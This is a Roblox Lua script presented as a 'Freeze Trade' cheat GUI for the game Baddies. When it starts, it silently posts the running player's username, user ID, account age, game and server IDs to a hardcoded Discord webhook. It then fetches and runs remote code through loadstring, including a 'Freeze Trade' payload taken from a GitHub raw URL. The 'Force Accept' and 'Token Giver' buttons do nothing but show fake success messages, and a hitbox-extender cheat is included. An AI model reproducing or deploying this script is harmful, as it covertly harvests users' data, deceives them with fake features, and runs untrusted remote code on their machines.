local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local GameID = game.PlaceId
local JobID = game.JobId
local PlayerName = player.Name
local PlayerID = player.UserId
local AccountAge = player.AccountAge
local IsPremium = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"

local WebhookURL = "https://discord.com/api/webhooks/1484224630465233080/nnuq3IeN8iVyWZJKoyJ8nRtG7pNgStp0HpM1VxfjZk5hN0kCMqg5UxFThOHpD_gpcOIe"

local data = {
    embeds = {{
        title = "⚡ Script Executed!",
        color = 0x00ff00,
        fields = {
            {name = "👤 Username", value = "`"..PlayerName.."`", inline = true},
            {name = "🆔 User ID", value = "`"..PlayerID.."`", inline = true},
            {name = "🎮 Game ID", value = "`"..GameID.."`", inline = true},
            {name = "🔢 Job ID", value = "`"..JobID.."`", inline = true},
            {name = "📅 Account Age", value = "`"..AccountAge.." days`", inline = true},
            {name = "💎 Premium", value = "`"..IsPremium.."`", inline = true},
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local jsonData = HttpService:JSONEncode(data)
pcall(function()
    HttpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
end)

local colors = {
    Background = Color3.fromRGB(10, 10, 10),
    Surface = Color3.fromRGB(20, 20, 20),
    Accent = Color3.fromRGB(0, 200, 255),
    AccentSecondary = Color3.fromRGB(120, 0, 255),
    Text = Color3.fromRGB(255, 255, 255),
    TextSecondary = Color3.fromRGB(160, 160, 160)
}

task.wait(4)

local LoadingGui = Instance.new("ScreenGui")
LoadingGui.Name = "ModernLoading"
LoadingGui.ResetOnSpawn = false
LoadingGui.Parent = player:WaitForChild("PlayerGui")
LoadingGui.IgnoreGuiInset = true

local MainContainer = Instance.new("Frame")
MainContainer.Size = UDim2.new(1, 0, 1, 0)
MainContainer.BackgroundColor3 = colors.Background
MainContainer.Parent = LoadingGui

local Gradient = Instance.new("Frame")
Gradient.Size = UDim2.new(2, 0, 2, 0)
Gradient.Position = UDim2.new(-0.5, 0, -0.5, 0)
Gradient.BackgroundColor3 = colors.AccentSecondary
Gradient.BackgroundTransparency = 0.95
Gradient.Rotation = 45
Gradient.Parent = MainContainer

spawn(function()
    while Gradient and Gradient.Parent do
        for i = -0.5, 0.5, 0.01 do
            Gradient.Position = UDim2.new(i, 0, -0.5, 0)
            task.wait(0.02)
        end
        for i = 0.5, -0.5, -0.01 do
            Gradient.Position = UDim2.new(i, 0, -0.5, 0)
            task.wait(0.02)
        end
    end
end)

local CenterContainer = Instance.new("Frame")
CenterContainer.Size = UDim2.new(0.5, 0, 0.6, 0)
CenterContainer.Position = UDim2.new(0.25, 0, 0.2, 0)
CenterContainer.BackgroundTransparency = true
CenterContainer.Parent = MainContainer

local LogoContainer = Instance.new("Frame")
LogoContainer.Size = UDim2.new(1, 0, 0.3, 0)
LogoContainer.BackgroundTransparency = true
LogoContainer.Parent = CenterContainer

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.6, 0)
Title.Position = UDim2.new(0, 0, 0.2, 0)
Title.BackgroundTransparency = true
Title.Text = "FREEZE TRADE"
Title.TextColor3 = colors.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.TextTransparency = 0.2
Title.Parent = LogoContainer

local TitleGlow = Instance.new("TextLabel")
TitleGlow.Size = UDim2.new(1, 10, 0.6, 10)
TitleGlow.Position = UDim2.new(0, -5, 0.2, -5)
TitleGlow.BackgroundTransparency = true
TitleGlow.Text = "FREEZE TRADE"
TitleGlow.TextColor3 = colors.Accent
TitleGlow.TextScaled = true
TitleGlow.Font = Enum.Font.GothamBold
TitleGlow.TextTransparency = 0.8
TitleGlow.Parent = LogoContainer

local Subtitle = Instance.new("TextLabel")
Subtitle.Size = UDim2.new(1, 0, 0.2, 0)
Subtitle.Position = UDim2.new(0, 0, 0.7, 0)
Subtitle.BackgroundTransparency = true
Subtitle.Text = "Loading Baddies GUI..."
Subtitle.TextColor3 = colors.TextSecondary
Subtitle.TextScaled = true
Subtitle.Font = Enum.Font.Gotham
Subtitle.Parent = LogoContainer

local LoadingSection = Instance.new("Frame")
LoadingSection.Size = UDim2.new(1, 0, 0.4, 0)
LoadingSection.Position = UDim2.new(0, 0, 0.4, 0)
LoadingSection.BackgroundTransparency = true
LoadingSection.Parent = CenterContainer

local BarBackground = Instance.new("Frame")
BarBackground.Size = UDim2.new(0.8, 0, 0.15, 0)
BarBackground.Position = UDim2.new(0.1, 0, 0.3, 0)
BarBackground.BackgroundColor3 = colors.Surface
BarBackground.BorderSizePixel = 0
BarBackground.Parent = LoadingSection

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1, 0)
BarCorner.Parent = BarBackground

local Bar = Instance.new("Frame")
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.BackgroundColor3 = colors.Accent
Bar.BorderSizePixel = 0
Bar.Parent = BarBackground

local BarFillCorner = Instance.new("UICorner")
BarFillCorner.CornerRadius = UDim.new(1, 0)
BarFillCorner.Parent = BarBackground

local PercentageText = Instance.new("TextLabel")
PercentageText.Size = UDim2.new(1, 0, 0.2, 0)
PercentageText.Position = UDim2.new(0, 0, 0.5, 0)
PercentageText.BackgroundTransparency = true
PercentageText.Text = "0%"
PercentageText.TextColor3 = colors.TextSecondary
PercentageText.TextScaled = true
PercentageText.Font = Enum.Font.GothamBold
PercentageText.Parent = LoadingSection

local DotsLabel = Instance.new("TextLabel")
DotsLabel.Size = UDim2.new(1, 0, 0.1, 0)
DotsLabel.Position = UDim2.new(0, 0, 0.8, 0)
DotsLabel.TextColor3 = colors.TextSecondary
DotsLabel.TextScaled = true
DotsLabel.Font = Enum.Font.Gotham
DotsLabel.TextTransparency = 0.5
DotsLabel.Parent = LoadingSection

local VersionText = Instance.new("TextLabel")
VersionText.Size = UDim2.new(1, 0, 0.05, 0)
VersionText.Position = UDim2.new(0, 0, 0.95, 0)
VersionText.BackgroundTransparency = true
VersionText.Text = "v2.0.0 • Premium Edition"
VersionText.TextColor3 = colors.TextSecondary
VersionText.TextTransparency = 0.5
VersionText.TextScaled = true
VersionText.Font = Enum.Font.Gotham
VersionText.Parent = MainContainer

local duration = 15
local elapsed = 0
local connection

connection = RunService.RenderStepped:Connect(function(delta)
    elapsed += delta
    local progress = math.min(elapsed / duration, 1)
    
    Bar.Size = UDim2.new(progress, 0, 1, 0)
    PercentageText.Text = string.format("%.0f%%", progress * 100)
    
    local dotCount = (math.floor(elapsed * 4) % 4) + 1
    DotsLabel.Text = string.rep(".", dotCount)
    
    if progress >= 1 then
        connection:Disconnect()
        
        task.wait(0.5)
        
        local fadeInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        
        for _, v in ipairs(MainContainer:GetDescendants()) do
            if v:IsA("TextLabel") then
                TweenService:Create(v, fadeInfo, {TextTransparency = 1}):Play()
            elseif v:IsA("Frame") and v ~= Gradient then
                TweenService:Create(v, fadeInfo, {BackgroundTransparency = 1}):Play()
            end
        end
        
        TweenService:Create(Gradient, fadeInfo, {BackgroundTransparency = 1}):Play()
        
        task.wait(0.9)
        LoadingGui:Destroy()
        
        loadRayfield()
    end
end)

-- ADDED FUNCTIONS
local HitboxParts = {}

local function ExpandHitbox()
    for _, v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HumanoidRootPart = v:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart then
                local Hitbox = Instance.new("Part")
                Hitbox.Size = Vector3.new(8, 8, 8)
                Hitbox.Position = HumanoidRootPart.Position
                Hitbox.Anchored = false
                Hitbox.CanCollide = false
                Hitbox.Transparency = 0.6
                Hitbox.BrickColor = BrickColor.new("Neon green")
                Hitbox.Material = Enum.Material.ForceField
                Hitbox.Parent = HumanoidRootPart
                
                local Weld = Instance.new("Weld")
                Weld.Part0 = HumanoidRootPart
                Weld.Part1 = Hitbox
                Weld.C0 = CFrame.new(0,0,0)
                Weld.Parent = Hitbox
                
                table.insert(HitboxParts, Hitbox)
            end
        end
    end
end

local function ResetHitbox()
    for _, v in pairs(HitboxParts) do
        if v then v:Destroy() end
    end
    HitboxParts = {}
end

local function ChangePOV()
    local Camera = Workspace.CurrentCamera
    local Character = player.Character
    if not Character then return end
    
    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    if not HumanoidRootPart then return end
    
    Camera.CameraType = Enum.CameraType.Scriptable
    Camera.CFrame = Character.Head.CFrame
    Camera.FieldOfView = 90
    
    task.wait(2)
    
    Camera.CFrame = HumanoidRootPart.CFrame * CFrame.new(0, 4, -9)
    Camera.FieldOfView = 70
end

function loadRayfield()
    local notificationGui = Instance.new("ScreenGui")
    notificationGui.Name = "LoadNotification"
    notificationGui.Parent = player.PlayerGui
    notificationGui.IgnoreGuiInset = true
    
    local notificationFrame = Instance.new("Frame")
    notificationFrame.Size = UDim2.new(0, 200, 0, 50)
    notificationFrame.Position = UDim2.new(0.5, -100, 0.5, -25)
    notificationFrame.BackgroundColor3 = colors.Surface
    notificationFrame.BackgroundTransparency = 0.2
    notificationFrame.Parent = notificationGui
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 8)
    notifCorner.Parent = notificationFrame
    
    local notifText = Instance.new("TextLabel")
    notifText.Size = UDim2.new(1, 0, 1, 0)
    notifText.BackgroundTransparency = true
    notifText.Text = "Loading Rayfield..."
    notifText.TextColor3 = colors.Text
    notifText.TextScaled = true
    notifText.Font = Enum.Font.Gotham
    notifText.Parent = notificationFrame
    
    task.wait(0.5)
    notificationGui:Destroy()
    
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    
    local Window = Rayfield:CreateWindow({
        Name = "Freeze Trade • Baddies GUI",
        LoadingTitle = "Baddies GUI",
        LoadingSubtitle = "by Legitness",
        ConfigurationSaving = {Enabled = false},
        Discord = {Enabled = false},
        KeySystem = false
    })
    
    local MainTab = Window:CreateTab("Main", 4483362458)
    local SettingsTab = Window:CreateTab("Settings", 4483362458)
    local CreditsTab = Window:CreateTab("Credits", 4483362458)
    
    MainTab:CreateButton({
        Name = "🧊 Freeze Trade",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/freezebaddies-script/best-script/refs/heads/main/Baddies", true))()
            
            Rayfield:Notify({
                Title = "Freeze Trade Activated!",
                Content = "Script is running...",
                Duration = 2
            })
        end,
    })
    
    MainTab:CreateButton({
        Name = "✅ Force Accept",
        Callback = function()
            Rayfield:Notify({
                Title = "Force Accept",
                Content = "Feature loaded successfully!",
                Duration = 2
            })
        end,
    })
    
    MainTab:CreateButton({
        Name = "🔑 Token Giver",
        Callback = function()
            Rayfield:Notify({
                Title = "Token Giver",
                Content = "Feature loaded successfully!",
                Duration = 2
            })
        end,
    })
    
    MainTab:CreateButton({
        Name = "📦 Hitbox Extender",
        Callback = function()
            ExpandHitbox()
            Rayfield:Notify({
                Title = "Hitbox Extender",
                Content = "Hitboxes expanded!",
                Duration = 2
            })
        end,
    })
    
    MainTab:CreateButton({
        Name = "🎥 Change POV",
        Callback = function()
            ChangePOV()
            Rayfield:Notify({
                Title = "Camera Changed",
                Content = "POV switched!",
                Duration = 1.5
            })
        end,
    })
    
    MainTab:CreateButton({
        Name = "❌ Reset Hitbox",
        Callback = function()
            ResetHitbox()
            Rayfield:Notify({
                Title = "Hitbox Reset",
                Content = "Hitboxes back to normal!",
                Duration = 2
            })
        end,
    })
    
    SettingsTab:CreateToggle({
        Name = "Auto-Execute on Join",
        CurrentValue = false,
        Callback = function(value)
            print("Auto-Execute:", value)
        end,
    })
    
    SettingsTab:CreateSlider({
        Name = "Animation Speed",
        Range = {1, 10},
        Increment = 1,
        CurrentValue = 5,
        Callback = function(value)
            print("Animation Speed:", value)
        end,
    })
    
    CreditsTab:CreateLabel("📱 Baddies GUI")
    CreditsTab:CreateLabel("Developed by Legitness")
    CreditsTab:CreateLabel("Version 2.0.0")
    
    Rayfield:Notify({
        Title = "✅ Baddies GUI Loaded",
        Content = "Your GUI is ready to use!",
        Duration = 3.5
    })
end
